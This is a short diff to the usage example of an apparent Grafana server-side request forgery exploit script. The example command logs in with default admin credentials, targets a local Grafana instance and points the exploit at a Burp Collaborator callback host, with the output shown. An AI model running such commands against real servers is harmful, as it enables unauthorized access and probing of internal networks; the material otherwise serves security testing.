@@ -26,7 +26,7 @@ Example
 ---
 
 ```
-python3 grafana.py -U admin -P admin -u http://8t2s8yx5gh5nw0z9bd3atkoprgx6lv.burpcollaborator.net
+python3 grafana.py -U admin -P admin -H http://localhost:3000 -u http://8t2s8yx5gh5nw0z9bd3atkoprgx6lv.burpcollaborator.net
 Refreshed Sources
 SSRF Source Updated
 Status code:   200
